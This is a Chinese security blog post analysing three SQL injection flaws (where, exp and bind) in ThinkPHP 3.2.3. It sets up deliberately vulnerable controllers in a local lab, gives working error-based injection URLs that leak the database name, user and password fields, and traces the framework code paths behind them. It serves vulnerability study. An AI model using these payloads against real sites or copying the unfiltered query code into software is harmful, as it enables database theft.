# ThinkPHP3.2.x SQL注入

Author: H3rmesk1t

Data: 2021.08.03

# 初始配置
- 这里利用`ThinkPHP3.2.3`做示例，[戳此进行下载](http://www.thinkphp.cn/donate/download/id/610.html)
- [ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法](https://www.cnblogs.com/kenshinobiy/p/9165662.html)
## 数据库配置
- 数据库相关内容配置，文件位置`Application/Home/Conf/config.php`

```php
<?php
return array(
    //'配置项'=>'配置值'
    //数据库配置信息
    'DB_TYPE'   ='mysql', // 数据库类型
    'DB_HOST'   ='localhost', // 服务器地址
    'DB_NAME'   ='cms', // 数据库名
    'DB_USER'   ='cms', // 用户名
    'DB_PWD'    ='20010728', // 密码
    'DB_PORT'   =3306, // 端口
    'DB_PARAMS' = array(), // 数据库连接参数
    'DB_PREFIX' ='', // 数据库表前缀
    'DB_CHARSET'='utf8', // 字符集
    'DB_DEBUG'  = TRUE, // 数据库调试模式 开启后可以记录SQL日志
);
```
## where注入控制器配置
控制器配置，文件位置`Application/Home/Controller/IndexController.class.php`

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $data = M('users')->find(I('GET.id'));
        var_dump($data);
    }
}
```
## exp注入控制器配置

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $User = D('Users');
        $map = array('user' =$_GET['user']);
        $user = $User->where($map)->find();
        var_dump($user);
    }
}
```
## bind注入控制器配置

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        $User = M("Users");
        $user['user_id'] = I('id');
        $data['last_name'] = I('last_name');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
}
```
# 漏洞利用
## where注入
Payload：`http://127.0.0.1/cms/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select  database()),0x7e),1)#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/c0ee9d1456f54adc8ee666329f6821a1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## exp注入

Payload：`http://127.0.0.1/cms/index.php/Home/Index/index?user[0]=exp&user[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)`

![在这里插入图片描述](https://img-blog.csdnimg.cn/22748af5f7d2462fad965ab20ecba9b8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## bind注入

Payload：`http://127.0.0.1/cms/index.php/Home/Index/index?id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&last_name=1`

![在这里插入图片描述](https://img-blog.csdnimg.cn/71273db9cc5f42b58ab93f5b60138952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 漏洞分析
## where注入

从官方文档我们可以知道如果`I()`方法不存在过滤参数的话会默认使用`htmlspecialchars`方法进行过滤，但是同时默认使用的`htmlspecialchars`函数并没有过滤`'`的

跟进`ThinkPHP/Common/functions.php`，如果`$filters`不存在就等值于`C('DEFAULT_FILTER')`而该值正等于`htmlspecialchars`，后面使用回调函数`array_map_recursive`对数据进行过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/6029f45a8dd546839280e90ab37a7bd6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

继续往下，后面利用`array_walk_recursive`，如果输入数据是数组的话回调`think_filter`进行数据进一步过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/64d940427172465d96eccb9667aa3ca9.png#pic_center)

跟进`think_filter`方法，如果传入的data是下面数组里面的其中一个就在其后面添加一个空格

![在这里插入图片描述](https://img-blog.csdnimg.cn/eb5dad10e37b4f5ab52528038fb2c6c3.png#pic_center)

进入`find`方法，跟进`ThinkPHP/Library/Think/Model.class.php`，因为我们传入的是一个数组，并且`$pk`值不为数组所以我们就可以直接绕过前面的预设定位到`_parseOptions`

![在这里插入图片描述](https://img-blog.csdnimg.cn/72062c57c50b4858a382784189e1c355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`_parseOptions`方法，定位到`_parseType`

![在这里插入图片描述](https://img-blog.csdnimg.cn/d5c5d9006772473697dc5de1fc84d23d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`_parseType`方法，发现这里对数据进行强制数据类型转换，然后返回给`_parseOptions`，这里对数据进行强制数据类型转换，然后放回，进行数据类型转换后自然是不存在sql注入，所以需要绕过这个函数的过滤，回到上一步发现只有经过`if(isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join']))`这个判断才会进入`_parseType`函数过滤，这里可以使用数组随便绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/29a268633ce1421188ad3e7a5322c05d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

继续往下，进入`select`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/d0aca678f44b4d1cac45b055768e74a3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP/Library/Think/Db/Driver.class.php`，定位到`buildSelectSql`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/1174f83347d3453d94fb7affcf6ce417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`buildSelectSql`方法，定位到`parseSql`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/f9b2d325d5bb4606a0fc0567b1636302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
进入`parseSql`方法，从`$options`数组中取出对应的数值在做相对于的处理后拼接到sql语句中，直接执行导致了sql注入漏洞，任意一个一维数组都可以绕过前面的限制但是payload使用的是`id[where]`，因为只有符合对应的数组键值才会取出拼接

![在这里插入图片描述](https://img-blog.csdnimg.cn/31ad2bd8960b4ad492a9abcbcac51fca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

拼接后的语句为

```bas
SELECT * FROM `users` WHERE 1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# LIMIT 1 
```

这里还有一些可以利用的Payload

```bas
?id[group]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
?id[field]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```


## exp注入

这里也是使用了`find`方法进行查询，但很明显的一点就是传入的值一开始就是一个数组，并且这里使用原生的GET来传输数据而不是thinkphp提供的`I()`方法，其原因是要注入成功必须要传入exp参数，而在上文中分析`I()`方法是发现会默认对数组一些过滤处理，其中就有exp，而exp后面跟了空格的话会导致注入失败

首先跟进`ThinkPHP/Library/Think/Model.class.php`中的`where`方法看看，因为`$where`是数组而整个where方法其实并没有对该数组什么特别的操作，只是在最后把`$where`数组赋值给了`$options`数组

![在这里插入图片描述](https://img-blog.csdnimg.cn/3baa79bdec8e4343853d809420a28a50.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入`find`方法，这里和前面跟的一样，并不会对该数组进行过滤，直接看看核心的`select`，跟进到`ThinkPHP/Library/Think/Db/Driver.class.php`中的`parseSql`方法，进入`parseWhere`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/84586778d58a492db457283b2b41e091.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

此时使用payload时候传入的值`$where`为：

```bas
array(1) {
  ["user"]=>
  array(2) {
    [0]=>
    string(3) "exp"
    [1]=>
    string(46) "=1 and updatexml(1,concat(0x7e,user(),0x7e),1)"
  }
}
```

分析后发现最后会进入到`parseWhereItem`方法中，在`exp`的elseif语句中把where条件直接用点拼接，要满足`$val`是数组，并且索引为0的值为字符串`exp`，那么就可以拼接sql语句了，所以传入`user[0]=exp&user[1]==1 and xxxxxx`，造成SQL注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/9437930a803646f2a246536b85e6c645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## bind注入

前面分析exp注入的时候，不仅exp那里存在问题，bind也同时存在问题，但是这里会在`$val[1]`的前面添加`:`符号导致sql注入失败

![在这里插入图片描述](https://img-blog.csdnimg.cn/e7d4d342a43a4eb396471fc21a0f90f6.png#pic_center)

进入`save`方法，跟进`ThinkPHP/Library/Think/Model.class.php`，定位到`update`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/5cd4c3307e7c42e2ac951fe6842ba45b.png#pic_center)

跟进`ThinkPHP/Library/Think/Db/Driver.class.php`中的`update`方法，我们发现它也调用了`parseWhere`方法，结合前面对exp注入的分析，猜测应该还存在bind注入，但是存在一个`:`阻断了注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/4abdb7b21aa24b89b2c452e070595bba.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
跟进`execute`方法，看看怎么处理这个`:`

![在这里插入图片描述](https://img-blog.csdnimg.cn/45d5280b5e674dcd876e64b6f7750f7d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/1b7ee18ec1714714bb84da68d6b6f7ef.png#pic_center)

- 执行替换操作，将`:0`替换为外部传进来的字符串，所以让传入参数等于0，这样就拼接了一个`:0`，然后会通过`strtr`被替换为1
- 这里是把`:0`进行替换为外部传进来的字符串所以我们的payload，这里必须要填`0`才能消去`:`

# 参考文章
 - [Thinkphp3 漏洞总结](https://y4er.com/post/thinkphp3-vuln/)